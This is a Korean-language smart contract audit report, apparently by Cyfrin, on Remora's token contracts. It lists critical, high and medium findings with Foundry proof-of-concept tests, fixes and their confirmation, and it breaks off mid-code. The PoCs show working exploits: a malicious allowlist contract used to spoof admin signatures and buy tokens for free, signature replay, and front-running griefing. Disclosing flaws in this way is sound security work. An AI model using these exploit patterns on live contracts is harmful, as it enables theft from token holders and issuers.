**Lead Auditors**

[0xStalin](https://x.com/0xStalin)

[100proof](https://x.com/1_00_proof)

**Assisting Auditors**



---

# 발견 사항 (Findings)
## 치명적 위험 (Critical Risk)


### `SignatureValidator::setAllowlist`가 제한되지 않아 토큰을 무료로 구매할 수 있음

**설명:** `SignatureValidator::setAllowlist`에 대한 접근 제한이 없습니다.

`SignatureValidator`는 `ReferralManager`와 `TokenBank`에 의해 상속되므로 이는 다운스트림에 영향을 미칩니다.

특히 `TokenBank`의 경우 다음을 의미합니다.
- 공격자가 `TokenBank::setAllowlist(maliciousAllowList)`를 호출할 수 있으며, 여기서 `maliciousAllowList::isSigner`는 공격자에 대해 단순히 `true`를 반환합니다.
- 그런 다음 Remora 관리자의 서명을 스푸핑할 수 있습니다.
- 스푸핑된 서명을 사용하여 `TokenBank::buyTokenOCP`를 호출합니다.
- `buyTokenOCP`는 `useStableCoin == false`로 `_buyToken`을 간접적으로 호출합니다.
- 따라서 `if (useStablecoin) {`로 보호되는 전체 코드 경로를 건너뛰고 공격자로부터 스테이블코인이 전송되지 않습니다.

동일한 취약점을 사용하여 `ReferralManager`의 모든 보너스를 훔칠 수도 있습니다.

**영향:** 공격자는 다음을 수행할 수 있습니다.
- 남은 모든 중앙 토큰(central tokens)을 무료로 구매
- `ReferralManager` 보너스를 훔침

**개념 증명 (Proof of Concept):** 아래 PoC는 중앙 토큰을 무료로 구매하는 것을 보여줍니다.

`MaliciousAllowlist.sol` 추가
```solidity
contract MaliciousAllowlist {

    address maliciousSigner;

    constructor(address _maliciousSigner) {
        maliciousSigner = _maliciousSigner;
    }

    function isSigner(address signer) public view returns (bool) {
        return (signer == maliciousSigner);
    }

}
```

그리고 `TokenBankTest.t.sol`에 다음 테스트를 추가합니다 (`MaliciousSigner` 임포트 추가 후).

```solidity
    function test_cyfrin_buyTokenOCP_for_free() public {
        uint64 TOTAL_TOKENS = 10_000;
        _addCentralToTokenBank(60e6, true, 50_000);

        centralTokenProxy.mint(address(tokenBankProxy), uint64(TOTAL_TOKENS));
        address attacker = getDomesticUser(2);

        (address attackerSigner, uint256 sk) = makeAddrAndKey("BUY_SIGNER");


        /*
         * Attacker sets a malicious Allowlist and signs the buy instead of a Remora Admin
         */
        vm.startPrank(attackerSigner);
        MaliciousAllowlist maliciousAllowlist = new MaliciousAllowlist(attackerSigner);
        tokenBankProxy.setAllowlist(address(maliciousAllowlist));
        bytes32 typeHash = keccak256("BuyToken(address investor, address token, uint256 amount)");
        bytes32 structHash = keccak256(abi.encode(typeHash, attacker, address(centralTokenProxy), uint256(TOTAL_TOKENS)));
        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        vm.stopPrank();

        /*
         * Now attacker buys all the tokens using the signature they created
         */
        vm.prank(attacker);
        tokenBankProxy.buyTokenOCP(attackerSigner, address(centralTokenProxy), TOTAL_TOKENS, sig);
        // attacker receives domestic child tokens
        assertEq(d_childTokenProxy.balanceOf(attacker), TOTAL_TOKENS);
    }
```

**권장 완화 조치:** `SignatureValidator`는 추상 컨트랙트이므로 `setAllowlist`는 내부(internal) 함수여야 합니다.

```diff
-    function setAllowlist(address allowlist) external {
+    function _setAllowlist(address allowlist) internal {
        if (allowlist == address(0)) revert InvalidAddress();
        SVStorage storage $ = _getSVStorageStorage();
        if ($._allowlist != allowlist) {
            $._allowlist = allowlist;
            emit AllowlistSet(allowlist);
        }
    }
```

그런 다음 `TokenBank`는 `restricted` 수정자를 사용하여 `setAllowlist`를 외부 함수로 노출해야 합니다.

```diff
+   function setAllowlist(address signer) external restricted {
+       super._setAllowlist(signer);
+   }
```

**Remora:** 커밋 [cc447da](https://github.com/remora-projects/remora-dynamic-tokens/commit/cc447da9fca1a997ffbb34f4d099be8f7dce7133)에서 수정됨.

**Cyfrin:** 확인함. `setAllowlist()`가 이제 제한되었습니다.


### `TokenBank` 및 `AllowList`의 서명은 영구적으로 무한정 재사용될 수 있음

**설명:** `TokenBank`는 구매자가 구매할 수 있는 토큰과 금액을 지정하는 오프체인 서명을 받아 토큰을 구매할 수 있도록 합니다. 서명을 사용하여 구매할 때 구매자는 구매에 대해 온체인에서 지불할 필요가 없습니다(오프체인에서 처리됨). 문제는 서명의 `hash`에 동일한 서명이 여러 구매를 처리하기 위해 재사용되는 것을 방지하기 위한 `nonce`가 포함되어 있지 않다는 것입니다.
- `hash`에는 `investor`, `token`, `amount`만 포함되어 있어 컨트랙트가 서명이 이미 사용되었는지 여부를 확인할 수 없습니다.
```solidity
//TokenBank.sol//
    // Handle payment off chain, including referral discount
    function buyTokenOCP(
        address signer,
        address tokenAddress,
        uint256 amount,
        bytes memory signature
    ) external nonReentrant {
        ...
        if (!verifySignature(signer, sender, tokenAddress, amount, signature))
            revert InvalidSignature();
        //@audit => No payment of stablecoin!
        _buyToken(address(0), sender, tokenAddress, amount, false);
    }

    function verifySignature(
        address signer,
        address investor,
        address token,
        uint256 amount,
        bytes memory signature
    ) internal view returns (bool result) {
//@audit-issue => No nonce on the hash of the signature
@>      bytes32 structHash = keccak256(
            abi.encode(
                BUY_TOKEN_TYPEHASH,
                investor,
                token,
                amount
        ));

        result = _verifySignature(signer, _hashTypedDataV4(structHash), signature);
    }

```

이와 동일한 문제가 `AllowList` 컨트랙트에도 존재하여 사용자가 제거된 경우 권한을 다시 얻기 위해 서명을 재사용할 수 있습니다.

**영향:** `TokenBank`의 경우:
- 구매자는 단일 서명을 얻는 비용만 지불하고 서명을 재사용하여 무한한 토큰을 구매할 수 있습니다.

`AllowList`의 경우:
- 사용자가 자신을 다시 허용 목록에 추가하기 위해 selfAllowUser 서명을 재생(replay)합니다.
- 관리자로서 제거된 악의적인 관리자가 제거된 후 서명을 재생하여 자신을 다시 활성화할 수 있습니다.

**개념 증명 (Proof of Concept):** `TokenBankTest.t.sol`에 다음 PoC를 추가하십시오.
```solidity
    function test_cyfrin_buyTokenOCP_offchain_ReUseSignature() public {
        uint256 TOKENS_TO_PURCHASE = 1;
        _addCentralToTokenBank(60e6, true, 50_000);
        // seed inventory
        centralTokenProxy.mint(address(tokenBankProxy), uint64(5));
        address to = getDomesticUser(2);
        // register authorized signer in allowlist
        (address signer, uint256 sk) = makeAddrAndKey("BUY_SIGNER");
        bytes4[] memory asel = new bytes4[](1);
        asel[0] = bytes4(keccak256("addAuthorizedSigner(address)"));
        accessMgrProxy.setTargetFunctionRole(address(allowListProxy), asel, ADMIN_TOKEN_ID);
        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);
        allowListProxy.addAuthorizedSigner(signer);
        // build EIP-712 signature for BuyToken(investor, token, amount)
        bytes32 typeHash = keccak256("BuyToken(address investor, address token, uint256 amount)");
        bytes32 structHash = keccak256(abi.encode(typeHash, to, address(centralTokenProxy), TOKENS_TO_PURCHASE));
        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        vm.startPrank(to);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        // to receives domestic child tokens
        assertEq(d_childTokenProxy.balanceOf(to), 5);
        vm.stopPrank();
    }

```

**권장 완화 조치:** 서명된 해시에 `nonce`를 추가하는 것을 고려하십시오. 서명 재생 공격에 익숙해지려면 다음 기사를 참조하십시오.
- [Mitigate Against Nonce Replay Attacks](https://www.remora-projects.io/blog/replay-attack-in-ethereum#mitigating-against-missing-nonce-replay-attacks)
- [Signature Replay Attacks](https://dacian.me/signature-replay-attacks#heading-missing-nonce-replay)

**Remora:** 커밋 [4f73c1d](https://github.com/remora-projects/remora-dynamic-tokens/commit/4f73c1de5e9b0beea6cdc0af3eb43bc4546ea203)에서 수정됨.

**Cyfrin:** 확인함. 서명 검증에 사용되는 digestHash에 nonce가 추가되었습니다.

\clearpage
## 높은 위험 (High Risk)


### 투자자를 해결(resolving)할 때 해결된 지급을 청구할 메커니즘이 없어 대기 중인 지급이 손실됨

**설명:** 계정에 대한 액세스 권한을 잃은 사용자를 해결할 때, `ChildToken::resolveUser` 함수는 잔액, 잠금 및 동결된 토큰을 새 주소로 마이그레이션하여 투자자가 이전 잔액을 유지하도록 합니다. 대기 중인 지급도 계산되어 새 주소에 할당되며, 투자자가 새 계정에서 대기 중인 지급을 청구할 수 있도록 하려는 의도입니다.

문제는 계산된 `resolvedPay`를 계정이 청구할 수 있는 함수가 없다는 것입니다. 즉, 이전 주소에 대한 대기 중인 지급이 실제로 새 주소로 마이그레이션되지만, 컨트랙트는 투자자가 해당 지급을 청구할 수 있는 메커니즘을 제공하지 않습니다.
```solidity
///DividendManager.sol//
    function _resolvePay(address oldAddress, address newAddress) internal {
//@audit-issue => no function allows the `newAddress` to claim the payout of the `oldAddress` saved on the `_resolvedPay` mapping associated to the `newAddress`
@>      _getHolderManagementStorage()._resolvedPay[newAddress] = SafeCast.toUint128(_claimPayout(oldAddress));
        emit PaymentResolved(oldAddress, newAddress);
    }
```

또한 이론적으로 newAddress가 기존 `resolvedPay` 잔액이 있는 주소인 경우 이전 주소에 대한 지급이 손실될 수 있습니다. `DividendManager::_resolvePay` 함수는 `resolvedPay` 매핑에 값이 있는지 여부에 관계없이 이전 주소의 계산된 지급을 할당합니다.

**영향:** 계정에 대한 액세스 권한을 잃고 `ChildToken::resolveUser`를 통해 잔액이 새 계정으로 이전된 투자자에 대한 대기 중인 지급이 손실됩니다.

**권장 완화 조치:** 새 주소가 이전 주소의 계산된 `resolvedPay`를 청구할 수 있는 함수를 구현하는 것을 고려하십시오.

**Remora:** 커밋 [1a69894](https://github.com/remora-projects/remora-dynamic-tokens/commit/1a698942c15a8a0ab7b866bca2a6409bcb221828)에서 수정됨.

**Cyfrin:** 확인함. 해결된 사용자의 지급은 `ChildToken::claimPayout`을 통해 `newAddress`가 청구할 수 있습니다.


### 투자자가 해결될 때 기존 잠금을 마이그레이션하는 것이 조작될 수 있어 기존 잠금이 의도보다 오래 지속될 수 있음

**설명:** 투자자를 해결할 때 `oldAddress`의 기존 잠금은 `newAddress`의 기존 잠금 바로 뒤에 `oldAddress`의 잠금을 추가하여 `newAddress`로 마이그레이션됩니다.
```solidity
    function _newAccountSameLocks(address oldAddress, address newAddress) internal {
        ...
//@audit => locks from `oldAddress` are appended after the existing locks of the `newAddress`
        uint16 len = oldData.endInd - oldData.startInd;
        for (uint16 i = 0; i < len; ++i) {
@>          newData.tokenLockUp[newData.endInd++] = oldData.tokenLockUp[
                oldData.startInd + i
            ];
        }
        newData.tokensLocked += oldData.tokensLocked;

        // reset old user data
        delete $._userData[oldAddress];
    }
```

잠금이 `lockUpTime`을 초과할 때 토큰을 잠금 해제하는 알고리즘과 사용 가능한 토큰을 계산하는 알고리즘은 만료되지 않은 잠금이 발견되자마자 사용자의 `tokenLockUps`에 대한 반복을 중지합니다.
```solidity
//LockUpManager.sol//

    function _unlockTokens(
        address holder,
        uint256 amount,
        bool disregardTime // used by admin actions
    ) internal returns (uint32 amountUnlocked) {
        ...
        for (uint16 i = userData.startInd; i < len; ++i) {
            // if not disregarding time, then check if the lock up time
            // has been served; if not break out of loop
//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
            if (
                !disregardTime &&
@>              curTime - userData.tokenLockUp[i].time < lockUpTime
            ) break;

            // if here means this lockup has been served & can be unlocked
            uint32 curEntryAmount = userData.tokenLockUp[i].amount;

            ...
        }

function availableTokens(
    address holder
) public view returns (uint256 tokens) {
    ...
    for (uint16 i = userData.startInd; i < len; ++i) {
        LockupEntry memory curEntry = userData.tokenLockUp[i];
        if (curTime - curEntry.time >= lockUpTime) {
            tokens += curEntry.amount;
//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
        } else {
@>          break;
        }
    }
}
        ...
    }

```

투자자를 해결할 때 토큰이 마이그레이션되는 방식과 만료되지 않은 잠금이 발견되자마자 알고리즘이 단락(short-circuit)되는 방식의 조합은, 투자자를 해결하는 트랜잭션이 프론트런되어 1개의 ChildToken이 `ChildToken::resolveUser` 함수가 토큰을 마이그레이션할 `newAddress`에 기부되는 그리핑 공격(griefing attack)을 허용합니다.
- 기부는 전체 `lockUpDuration` 동안 `newAddress`에 잠금을 생성합니다. 이 잠금은 `newAddress`의 첫 번째 잠금이 되며, 이는 `oldAddress`의 모든 기존 토큰이 해당 새 잠금 **뒤에** 추가됨을 의미합니다. 다시 말해, `oldAddress`의 모든 기존 잠금은 해당 잠금에 대한 `lockUpDuration`이 이미 충족되었는지 여부에 관계없이 새 잠금이 `lockUpDuration`에 도달할 때까지 잠긴 상태로 유지됩니다.


**영향:** 기존 잠금 기간이 조작되어 newAddress의 잠금이 의도한 것보다 오래 지속되도록 강제할 수 있습니다.

**개념 증명 (Proof of Concept):** `ChildTokenAdminTest.t.sol` 테스트 파일에 다음 PoC를 추가하십시오.
PoC는 다음을 보여줍니다.
1. 사용자를 해결하면 `oldUser`의 기존 잠금이 유지되어야 합니다(공격이 수행되지 않을 때).
2. 공격이 수행되면 `newUser`의 마이그레이션된 토큰이 더 긴 기간 동안 잠깁니다.
```solidity
    function test_GrieffAttacToExtendLocksWhenResolving() public {
        uint32 DEFAULT_LOCK_TIME = 365 days;
        uint32 QUART_LOCKTIME = DEFAULT_LOCK_TIME / 4;

        address oldUser = getDomesticUser(1);
        address newUser = getDomesticUser(2);
        address extraInvestor = getDomesticUser(3);

        centralTokenProxy.mint(address(this), uint64(2));
        centralTokenProxy.dynamicTransfer(extraInvestor, 2);

        vm.warp(DEFAULT_LOCK_TIME);

        centralTokenProxy.mint(address(this), uint64(4));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        // Distribute payout!
        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);
        paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6) total

        vm.warp(block.timestamp + QUART_LOCKTIME);
        centralTokenProxy.mint(address(this), uint64(1));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        centralTokenProxy.mint(address(this), uint64(1));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        centralTokenProxy.mint(address(this), uint64(1));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        uint256 snapshot1 = vm.snapshot();
            //@audit-info => Validate each 3 months a new token would've been unlocked!
            for(uint8 i = 1; i == 4; i++) {
                vm.warp(block.timestamp + (QUART_LOCKTIME * i));
                assertEq(d_childTokenProxy.availableTokens(oldUser),i);
            }
        vm.revertTo(snapshot1);


        //@audit-info => Resolving the oldUser without the grieffing attack being executed!
        d_childTokenProxy.resolveUser(oldUser, newUser);

        //@audit-info => Validate each 3 months a new token would've been unlocked, even after the resolve, locks remains as they are
        for(uint8 i = 1; i == 4; i++) {
            vm.warp(block.timestamp + (QUART_LOCKTIME * i));
            assertEq(d_childTokenProxy.availableTokens(oldUser),i);
        }


        vm.revertTo(snapshot1);

        assertEq(d_childTokenProxy.availableTokens(oldUser),0);

        //@audit => Frontruns resolveUser
        vm.prank(extraInvestor);
        d_childTokenProxy.transfer(newUser, 1);

        d_childTokenProxy.resolveUser(oldUser, newUser);

        //@audit-issue => Because of the donation prior to resolveUser() was executed, the locks for the migrated tokens are messed up and all the tokens are extended until the lock of the donated token is over!
        //@audit-issue => Migrated tokens from oldUser are locked for an entire year
        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser),0);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser),0);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser),0);

        //@audit-issue => Only until the donated tokens is unlocked, so are all the migrated tokens
        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser), 5);
    }
```

**권장 완화 조치:** `oldAddress`에서 `newAddress`로 잠금을 마이그레이션하는 로직을 리팩토링하여 단순히 기존 잠금 끝에 추가되지 않도록 하는 것을 고려하십시오. 대신 기존 잠금을 반복하고 `tokenLockup.time`을 비교하여 모든 잠금의 시간이 시간을 기준으로 순차적으로 올바르게 정렬되도록 재정렬하십시오. 이렇게 하면 `oldAddress`의 기존 잠금이 만료되는 즉시 `newAddress`의 토큰을 올바르게 해제할 수 있습니다.

**Remora:** 커밋 [3d6d874](https://github.com/remora-projects/remora-dynamic-tokens/commit/3d6d87430bbabb16afce37e5cbfe968093fc2d24)에서 수정됨.

**Cyfrin:** 확인함. `oldAddress`를 해결하기 전에 `newAddress`가 모든 문서에 서명하도록 요구하는 대신 `oldAddress`에서 `newAddress`로 서명을 이전하도록 `ChildToken::resolveUser`를 리팩토링했습니다. 이 변경으로 인해 `newAddress`가 `ChildToken`을 받는 것을 방지하므로 `newAddress`에 기존 잠금이 존재하지 않게 됩니다.


### `FiveFiftyRule::_updateEntityAllowance`에서 곱하기 전 나누기로 인한 정밀도 손실로 캡 초과 발생

**설명:** `_updateEntityAllowance` 함수는 다음을 포함합니다.
```solidity
(REMORA_PERCENT_DENOMINATOR / aData.equity) * amount
```

이는 `REMOTE_PERCENT_DENOMINATOR * amount / aData.equity`여야 하며 그렇지 않으면 정밀도 손실이 발생합니다.

`_updateEntityAllowance`는 `add == false`일 때 허용량을 줄여야 하는 금액을 계산하는 데 사용되므로 이 문제는 실제로 남은 허용량이 너무 높아지는 결과를 초래합니다.

**영향:** `add == true`일 때 새 허용량은 원래보다 훨씬 낮아져 투자자에게 불만을 줄 것입니다.
`add == false`일 때 새 허용량은 원래보다 훨씬 높아질 수 있으며, 이는 개별적으로 토큰을 구매하고 *동시에* 엔터티의 일부인 투자자가 캡을 초과할 수 있음을 의미합니다.

**개념 증명 (Proof of Concept):**
1. 먼저 `canTransfer`의 버그를 수정하십시오. 이 버그가 이 버그를 모호하게 하기 때문입니다.

```diff
@@ -505,16 +505,16 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {
         // to side changes
         if (to != address(0)) {
             IndividualData storage iTo = individualData[to];
-
+
             if (iTo.isEntity) { // if entity
-                if (entityData[to].allowance <= amount) {
-                    entityData[to].allowance -= SafeCast.toUint64(amount);
+                if (entityData[to].allowance >= amount) {
+                    entityData[to].allowance -= SafeCast.toUint64(amount);

                     iTo.lastBalance += SafeCast.toUint64(amount);
                     emit FiveFiftyApproved(from, to, amount);
                     return true;
                 } else revert ();
```

2. 이제 아래 파일을 추가하고 테스트를 실행하십시오. 콘솔 출력에서 다음을 볼 수 있습니다.

```
*** INVARIANT VIOLATED ***
  exposure:   1200001000000
  cap amount: 1000000000000
```

파일의 소스 코드는 다음과 같습니다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/console2.sol";
import {RemoraTestBase} from "../RemoraTestBase.sol";
import {FiveFiftyRule} from "../../../contracts/Compliance/FiveFiftyRule.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";


contract FiveFiftyRule_RoundingPoC is RemoraTestBase {
    FiveFiftyRule internal fiveFiftyRule;

    // helpers (same as your math discussion)
    uint256 constant DENOM = 1_000_000;

    function setUp() public override {
        RemoraTestBase.setUp();

        // Deploy rule and initialize
        fiveFiftyRule = FiveFiftyRule(address(new ERC1967Proxy(address(new FiveFiftyRule()), "")));
        fiveFiftyRule.initialize(address(accessMgrProxy), 0);

        // Allow our test to call restricted functions on fiveFiftyRule and child
        bytes4[] memory sel = new bytes4[](1);
        sel[0] = FiveFiftyRule.addToken.selector;
        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), sel, ADMIN_TOKEN_ID);
        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);

        bytes4[] memory cs = new bytes4[](2);
        cs[0] = bytes4(keccak256("setFiveFiftyCompliance(address)"));
        cs[1] = bytes4(keccak256("setLockUpTime(uint32)"));
        accessMgrProxy.setTargetFunctionRole(address(d_childTokenProxy), cs, ADMIN_TOKEN_ID);

        // Wire fiveFiftyRule to domestic child; remove lockup
        d_childTokenProxy.setFiveFiftyCompliance(address(fiveFiftyRule));
        d_childTokenProxy.setLockUpTime(0);
    }

    function test_RoundingDown_Allows_ExtraEntityToken_ExceedingLookThroughCap() public {
        // --------------------------
        // Parameters we use for the PoC
        // --------------------------
        // Total supply: large, so we can transfer a very large amount to the catalyst without violating the cap.
        // We'll target a 50% cap for the catalyst (to leave room for a huge direct transfer).
        uint64 totalSupply = 10_000_000;
        uint32 capPercent = 100_000;
        uint64 capAmountMicros = totalSupply * capPercent;

        uint64 equityMu = 333_334;
        uint256 ENTITY_BAL = 1_500_000;
        uint256 CATALYST_BAL = 700_000;

        centralTokenProxy.mint(address(this), totalSupply);
        fiveFiftyRule.addToken(address(centralTokenProxy));

        // Choose a catalyst (a domestic user) and an entity address
        address entity = getDomesticUser(0);
        address catalyst = getDomesticUser(1);
        address otherInvestor = getDomesticUser(2); // will never directly own any tokens in this example
        address[] memory investors = new address[](2);
        investors[0] = catalyst;
        investors[1] = otherInvestor;

        bytes4[] memory psel = new bytes4[](1);
        psel[0] = bytes4(keccak256("setMaxPercentIndividual(address,uint32)"));
        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), psel, ADMIN_TOKEN_ID);
        fiveFiftyRule.setMaxPercentIndividual(catalyst, capPercent);


        bytes4[] memory esel = new bytes4[](2);
        esel[0] = bytes4(keccak256("createEntity(address,address,uint64,uint64,address[])"));
        esel[1] = bytes4(keccak256("setCatalyst(bool,address,address,uint64,uint64)"));
        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), esel, ADMIN_TOKEN_ID);


        uint64 calculatedAllowance = SafeCast.toUint64(totalSupply * 1e6 * capPercent / equityMu);
        console2.log("calculatedAllowance: %s", calculatedAllowance);

        // Check that allowance is correct
        uint256 userProportion = calculatedAllowance * equityMu / 1e6;
        assertEq(userProportion, capAmountMicros - 1);

        uint256 exposure = uint256(ENTITY_BAL)* 1e6 * equityMu / 1e6 + CATALYST_BAL * 1e6;

        console2.log("\n\n*** INVARIANT VIOLATED ***");
        console2.log("exposure:   %s", exposure);
        console2.log("cap amount: %s\n\n", capAmountMicros);
        assertGe(exposure, capAmountMicros);



        fiveFiftyRule.createEntity(entity, catalyst, equityMu, calculatedAllowance, investors);
        centralTokenProxy.dynamicTransfer(entity, ENTITY_BAL);
        logEntity("0", entity);
        logIndividual("entity 0", entity);
        logIndividual("catalyst 0", catalyst);

        centralTokenProxy.dynamicTransfer(catalyst, CATALYST_BAL);
        logEntity("1", entity);
        logIndividual("entity 1", entity);
        logIndividual("catalyst 1", catalyst);

    }

    function logEntity(string memory s, address entity) internal view {
        FiveFiftyRule.EntityData memory ed = fiveFiftyRule.testing_entityData(entity);
        console2.log("---  EntityData %s ---", s );
        console2.log("catalyst:     %s", ed.catalyst);
        console2.log("equity:       %s", ed.equity);
        console2.log("allowance:    %s", ed.allowance);
    }

    function logIndividual(string memory s, address individual) internal view {
        FiveFiftyRule.IndividualData memory id = fiveFiftyRule.testing_individualData(individual);
        console2.log("---  IndividualData %s ---", s);
        console2.log("isEntity:         %s", id.isEntity);
        console2.log("numCatalyst:      %s", id.numCatalyst);
        console2.log("groupId:          %s", id.groupId);
        console2.log("customMaximum:    %s", id.customMaximum);
        console2.log("lastBalance:      %s", id.lastBalance);

    }
}
```

**권장 완화 조치:** 연산자 순서를 `REMOTE_PERCENT_DENOMINATOR * amount / aData.equity`로 변경하십시오.

**Remora:** 커밋 [de9a89a](https://github.com/remora-projects/remora-dynamic-tokens/commit/de9a89a5eca6a5c9089bc07904662b8a64556dea)에서 수정됨.

**Cyfrin:** 확인함. 연산 순서를 업데이트하여 먼저 곱한 다음 나눕니다.


### 개인이 다른 엔터티에 대한 여러 촉매제가 있는 그룹에 속한 경우 엔터티 허용량을 업데이트하면 개인이 속하지 않은 엔터티의 허용량을 실수로 수정할 수 있음

**설명:** 문제는 발신자나 수신자와 관련이 없는 엔터티가 허용량을 수정하거나 tx를 되돌리게 될 수 있다는 것입니다.

시스템은 다음 등록을 허용합니다.
- 최대 하나의 그룹에 속하거나 속하지 않은 개인.
- 여러 개인이 있는 그룹
- 여러 개인이 있지만 촉매제가 하나뿐인 엔터티.
- 각 그룹은 다른 엔터티에 대한 촉매제인 여러 개인을 가질 수 있습니다.
- 한 그룹의 개인은 반드시 나머지 개인이 속한 모든 동일한 엔터티에 속하지는 않습니다.
- 한 투자자가 여러 엔터티의 촉매제가 될 수 있습니다.

이러한 가능성의 조합으로 다음과 같은 시나리오가 가능합니다.

| 엔터티 | 투자자 | 촉매제 |
|---|---|---|
| EntityA | InvestorA, InvestorB | InvestorB |
| EntityB | InvestorB, InvestorC | InvestorB |
| EntityC | InvestorA, InvestorC | InvestorA |
| EntityD | InvestorB, InvestorC | InvestorB |


| 그룹 | 투자자 | groups.numOfCatalysts |
|---|---|---|
| GroupA | InvestorA, InvestorB | 4 |
| GroupB | InvestorC, InvestorD | 0 |


| 투자자 | individualData.numOfCatalysts |
| --|---|
| InvestorA | 1 |
| InvestorB | 3 |
| InvestorC | 0 |
| InvestorD| 0 |


이전 구성을 사용하면 InvestorA에서의 전송은 EntityB와 EntityD에 영향을 미치게 됩니다. InvestorA와 InvestorB가 같은 그룹에 있고, InvestorB가 EntityB와 EntityD의 촉매제이기 때문입니다(여기서 InvestorC와 InvestorD는 부분이며 InvestorA와는 관련이 없습니다).

문제는 `FiveFiftyRule::canTransfer` 함수의 다음 코드 블록에서 발생합니다.
```solidity
    function canTransfer(address from, address to, uint256 amount) external returns (bool) {
        ...

            if (iFrom.isEntity) {
                entityData[from].allowance += SafeCast.toUint64(amount);
//@audit-info => If `from` is on a group and that group has multiple catalysts!
            } else if (gId != 0 && groups[gId].numCatalyst != 0) {
                //@audit-info => iterates over ALL the individuals of the group `from` belongs to!
                uint256 len = groups[gId].individuals.length;
                for (uint256 i; i<len; ++i) {
                    address ind = groups[gId].individuals[i];
//@audit-issue => ENTERS If the current individual of the group (doesn't matter if this individual is the `from`) is a catalyst on at least one entity
@>                  if (individualData[ind].numCatalyst != 0)
                        _updateEntityAllowance(true, ind, amount);
                }
            }
        ...

    function _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {
//@audit-info => total times the individual is a catalyst on != entities!
        uint8 numCatalyst = individualData[inv].numCatalyst;

//@audit-info => Entities the individual belongs to!
        uint256 len = findEntity[inv].length;

 //@audit-info => iterates over the entities the individual belongs to
        for (uint256 i; i<len; ++i) {
//@audit-info => if individual is not a catalyst on any entity, break out of the loop!
            if (numCatalyst == 0) break;

//@audit-info => Loads the entity data the individual belongs to on the current indx being iterated
            EntityData storage aData = entityData[findEntity[inv][i]];

//@audit-info => if the catalyst of the entity is not the investor, continue to the next entity!
            if (aData.catalyst != inv) continue;

 //@audit-info => If reaches here it means the investor is the catalyst of the entity!

            --numCatalyst;

            uint64 adjusted_amt = SafeCast.toUint64(
                (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount
            );
//@audit-issue => Modifies allowance or could cause a revert on an entity that has nothing to do with the actual `from` individual because the catalyst of that entity belonged to the same group as the `from` individual, which caused execution to get here, regardless that `from` individual is not even part of the entity being modified
            if (add) aData.allowance += adjusted_amt;
            else if (adjusted_amt > aData.allowance) return false;
            else aData.allowance -= adjusted_amt;
        }
        return true;
    }

```


**영향:** 이 버그는 두 가지 다른 경로로 이어질 수 있습니다.
1. 발신자의 경우 - 모든 엔터티에 충분한 허용량이 있는 경우, 개인이 속하지 않은 엔터티에 대한 허용량이 실수로 수정될 수 있습니다.
2. 수신자의 경우 - 엔터티 중 하나에 충분한 허용량이 없으면 tx가 되돌립니다.

**권장 완화 조치:** 엔터티에 대한 허용량 업데이트를 리팩토링하여 이 시나리오에 해당하지 않도록 하는 것을 고려하십시오. `from` 또는 `to`가 속하지 않은 엔터티의 허용량을 업데이트하지 않는 것을 고려하십시오.

**Remora:** 인지함. 그룹은 개인으로 간주되어야 하므로 개인 A와 B가 같은 그룹에 있지만 서로 다른 엔터티에 있는 경우, 둘 중 하나의 전송은 어떤 방식으로든 해당 그룹에 연결된 모든 엔터티에 영향을 미쳐야 합니다.

**Cyfrin:** 확인함.

\clearpage
## 중간 위험 (Medium Risk)


### 모든 하위 토큰의 자체 전송으로 인해 `ChildToken.totalInvestors` 스토리지 변수 감소 발생

**설명:** [*`ChildToken::resolveUser` 호출을 프론트러닝하고 oldUser의 `childToken` 잔액 전체를 전송하면 `totalInvestor` 카운터가 두 번 감소하는 문제*](#frontrunning-call-to-childtokenresolveuser-and-transferring-all-of-the-oldusers-childtoken-balance-causes-the-totalinvestor-counter-to-be-decremented-twice)와 유사하게, `user`가 `ChildToken::transfer(user, <balance of user>)`를 호출하면 `totalInvestors`가 감소합니다.

이는 `_update`의 재정의가 전송 *전* 잔액을 기준으로 감소/증가를 결정하기 때문입니다.

```solidity
    function _update(
        address from,
        address to,
